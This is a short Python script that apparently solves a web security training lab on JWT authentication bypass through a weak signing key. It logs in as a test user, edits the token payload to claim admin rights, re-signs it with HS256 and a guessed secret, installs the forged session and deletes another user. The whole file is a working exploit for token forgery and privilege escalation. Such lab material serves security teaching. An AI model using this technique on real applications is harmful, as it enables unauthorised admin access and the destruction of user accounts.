import argparse
import os
import sys

sys.path.insert(0, os.path.join(os.path.dirname(__file__), ".."))
from common import become_admin_payload, delete_carlos, get_session_token, lab_session, sign_hs256, set_session


parser = argparse.ArgumentParser(add_help=False)
parser.add_argument("--secret", default="secret1")
known, remaining = parser.parse_known_args()
sys.argv = [sys.argv[0]] + remaining

lab = lab_session("JWT authentication bypass via weak signing key")
lab.login("wiener", "peter")

header, payload = become_admin_payload(get_session_token(lab))
header["alg"] = "HS256"
forged = sign_hs256(header, payload, known.secret.encode())

set_session(lab, forged)
delete_carlos(lab)
